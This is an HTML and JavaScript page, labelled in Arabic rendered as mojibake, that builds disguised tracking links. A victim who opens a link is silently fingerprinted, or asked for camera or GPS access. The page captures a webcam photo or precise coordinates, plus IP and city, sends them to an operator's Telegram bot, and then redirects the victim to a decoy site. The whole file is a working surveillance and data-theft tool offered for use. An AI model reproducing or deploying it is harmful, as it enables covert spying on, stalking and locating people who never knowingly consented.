<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G-INTEL MULTI-SYSTEM</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    <style>
        :root { --red: #ff0000; --dark: #0a0a0a; --card: #151515; }
        body { background-color: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { width: 90%; max-width: 480px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.15); }
        h2 { color: var(--red); text-align: center; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 25px; border-bottom: 2px solid var(--red); padding-bottom: 10px; }
        label { display: block; margin-top: 10px; font-size: 14px; color: #888; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; outline: none; box-sizing: border-box; }
        select { cursor: pointer; color: var(--red); font-weight: bold; }
        .btn { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        .btn:hover { background: #cc0000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
        #outputArea { display: none; margin-top: 25px; background: #000; padding: 15px; border-radius: 8px; border: 1px dashed var(--red); }
        textarea { width: 100%; height: 60px; background: transparent; color: #ff4d4d; border: none; resize: none; font-size: 11px; outline: none; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div id="adminPanel" class="container">
    <h2>Ù…Ø±ÙƒØ² Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª</h2>
    <label>Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª:</label>
    <input type="text" id="botToken" placeholder="ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª">
    <input type="text" id="chatId" placeholder="Ø§Ù„Ø£ÙŠØ¯ÙŠ (Chat ID)">
    
    <label>Ù†ÙˆØ¹ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© (Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚):</label>
    <select id="hackMode">
        <option value="info">1. Ø³Ø­Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² (ØµØ§Ù…Øª)</option>
        <option value="camera">2. Ø³Ø­Ø¨ ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Ø·Ù„Ø¨ Ø¥Ø°Ù†)</option>
        <option value="gps">3. Ø³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚ GPS (Ø·Ù„Ø¨ Ø¥Ø°Ù†)</option>
    </select>

    <label>Ø§Ù„ØªÙ…ÙˆÙŠÙ‡ (Ø±Ø§Ø¨Ø· Ø§Ù„ØªØ­ÙˆÙŠÙ„):</label>
    <input type="text" id="targetUrl" placeholder="https://google.com">
    
    <button class="btn" onclick="buildPayload()">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø®ØµØµ</button>

    <div id="outputArea">
        <p style="font-size: 12px; margin: 0;">Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¬Ø§Ù‡Ø² Ù„Ù„Ø§Ø®ØªØµØ§Ø±:</p>
        <textarea id="finalUrl" readonly></textarea>
    </div>
</div>

<video id="v-hidden" autoplay playsinline class="hidden"></video>
<canvas id="c-hidden" class="hidden"></canvas>

<script>
    const params = new URLSearchParams(window.location.search);

    // --- Ù†Ø¸Ø§Ù… Ø§Ù„Ø¶Ø­ÙŠØ© ---
    if (params.has('m')) { // m = Mode
        document.getElementById('adminPanel').classList.add('hidden');
        const config = JSON.parse(atob(params.get('m')));
        executeMode(config);
    }

    async function executeMode(config) {
        const mode = config.type;
        
        if (mode === 'info') {
            await sendReport(config, "Ø¨ÙŠØ§Ù†Ø§Øª Ø£Ø³Ø§Ø³ÙŠØ© ÙÙ‚Ø·");
            window.location.replace(config.url);
        } 
        else if (mode === 'camera') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v-hidden');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('c-hidden');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        sendReport(config, "ØµÙˆØ±Ø© ÙƒØ§Ù…ÙŠØ±Ø§", blob);
                        stream.getTracks().forEach(t => t.stop());
                        setTimeout(() => window.location.replace(config.url), 1000);
                    }, 'image/jpeg');
                }, 1500);
            } catch (e) {
                sendReport(config, "Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
                window.location.replace(config.url);
            }
        } 
        else if (mode === 'gps') {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gpsData = `ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚:\nØ§Ù„Ø§Ø±ØªÙØ§Ø¹: ${pos.coords.latitude}\nØ§Ù„Ø¹Ø±Ø¶: ${pos.coords.longitude}\nØ±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±Ø§Ø¦Ø·:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await sendReport(config, gpsData);
                    window.location.replace(config.url);
                }, (err) => {
                    sendReport(config, "Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ GPS");
                    window.location.replace(config.url);
                }, {enableHighAccuracy: true});
            } else {
                sendReport(config, "Ø§Ù„Ø¬Ù‡Ø§Ø² Ù„Ø§ ÙŠØ¯Ø¹Ù… GPS");
                window.location.replace(config.url);
            }
        }
    }

    async function sendReport(config, extra, photoBlob = null) {
        const parser = new UAParser();
        const ua = parser.getResult();
        let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}

        const message = `
âš ï¸ **ØªÙ‚Ø±ÙŠØ± Ø¬Ø¯ÙŠØ¯ [${config.type.toUpperCase()}]**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${ua.device.vendor || ''} ${ua.device.model || 'PC'}
ğŸ–¥ï¸ **Ø§Ù„Ù†Ø¸Ø§Ù…:** ${ua.os.name}
ğŸŒ **IP:** \`${net.ip || 'Ù…Ø®ÙÙŠ'}\`
ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠ:** ${net.city || ''}, ${net.country_name || ''}
ğŸ“Š **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©:**
${extra}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: config.chat, text: message, parse_mode: 'Markdown' })
        });

        if (photoBlob) {
            const fd = new FormData();
            fd.append('chat_id', config.chat);
            fd.append('photo', photoBlob, 'shot.jpg');
            await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
        }
    }

    // --- Ù†Ø¸Ø§Ù… Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© ---
    function buildPayload() {
        const token = document.getElementById('botToken').value;
        const chat = document.getElementById('chatId').value;
        const type = document.getElementById('hackMode').value;
        const url = document.getElementById('targetUrl').value;

        if(!token || !chat || !url) return alert("Ø§Ù…Ù„Ø£ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª!");

        const data = { token, chat, type, url };
        const encoded = btoa(JSON.stringify(data));
        const final = window.location.origin + window.location.pathname + "?m=" + encoded;

        document.getElementById('finalUrl').value = final;
        document.getElementById('outputArea').style.display = 'block';
    }
</script>
</body>
</html>
